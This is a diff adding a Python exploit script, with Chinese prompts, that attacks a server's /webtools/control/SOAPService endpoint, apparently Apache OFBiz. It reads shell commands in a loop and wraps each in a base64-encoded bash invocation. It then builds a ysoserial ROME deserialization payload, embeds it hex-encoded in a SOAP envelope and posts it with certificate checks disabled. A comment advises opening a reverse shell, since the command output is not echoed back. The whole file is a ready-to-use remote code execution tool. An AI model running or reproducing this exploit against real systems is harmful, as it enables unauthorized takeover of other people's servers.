@@ -1,0 +1,60 @@
+#coding:utf-8
+import binascii
+import os
+import requests
+import urllib3
+import uuid
+import click
+import base64
+urllib3.disable_warnings()
+
+# 不回显。建议直接反弹shell 
+@click.command()
+@click.option('--target', prompt="输入你的攻击目标", help='目标URL')
+def main(target):
+    if(not os.path.exists("ysoserial.jar")):
+        exit("where is ysoserial.jar?")
+    while(True):
+        cmd = input("shell> ")
+        print(" payload发送开始 ".center(50,"-"))
+        url = target
+        cmd = "java -jar ysoserial.jar ROME  \"bash -c {echo,%s}|{base64,-d}|bash\" > tmp"%(base64.b64encode(cmd.encode()).decode())
+        #print(cmd)
+        r = os.popen(cmd)   
+        r.close()  
+        with open("tmp",'rb') as f:
+            payload = binascii.hexlify(f.read())
+        data = '''
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+            <soapenv:Header/>
+            <soapenv:Body>
+            <ser>
+        <map-HashMap>
+            <map-Entry>
+                <map-Key>
+                    <cus-obj>{0}</cus-obj>
+                </map-Key>
+                <map-Value>
+                    <std-String value="http://baidu.com"/>
+                </map-Value>
+            </map-Entry>
+        </map-HashMap>
+            </ser>
+            </soapenv:Body>
+            </soapenv:Envelope>
+            '''.format(payload.decode())
+        headers = {
+            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
+        }
+        try:
+            print("[-] Send payload to {0}".format(url))
+            (requests.post(url+"/webtools/control/SOAPService",data=data,verify=False,headers=headers,timeout=5).text)
+            print(" payload发送完毕 ".center(50,"+"))
+        except:
+            pass
+            print(" payload发送失败 ".center(50,"-"))
+        
+
+
+if __name__ == "__main__":
+    main()
